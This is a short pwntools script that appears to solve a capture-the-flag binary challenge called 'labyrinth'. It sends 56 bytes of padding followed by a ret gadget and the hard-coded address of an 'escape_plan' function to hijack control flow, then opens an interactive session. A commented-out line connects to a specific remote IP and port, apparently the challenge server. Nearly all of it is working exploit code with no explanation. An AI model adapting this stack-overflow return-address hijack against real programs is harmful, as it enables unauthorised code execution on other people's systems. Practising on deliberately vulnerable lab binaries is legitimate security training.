from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./labyrinth")
#libc = ELF("./libc.so.6")
ld_preload = {"LD_PRELOAD": "../glibc/libc.so.6"}

#p = remote('159.65.86.238', 31248)
#p = process("./labyrinth")
p = gdb.debug("./labyrinth", '''
break *main
break *main+508
break *escape_plan
''')

# Stack Canary Leak Setup
p.sendline(b"069")
p.recvline()

escape_plan = p64(0x0000000000401255)
pop_rbp = p64(0x0000000000401209)
ret = p64(0x0000000000401016)

# Exploit
padA = b'A' * 56
padB = b'B' * (56 - 48)

exploit = padA + ret + escape_plan

# pause() allows the progam to catch up? It works like time.sleep(2) in python2
#pause()
p.sendline(exploit)
p.interactive()
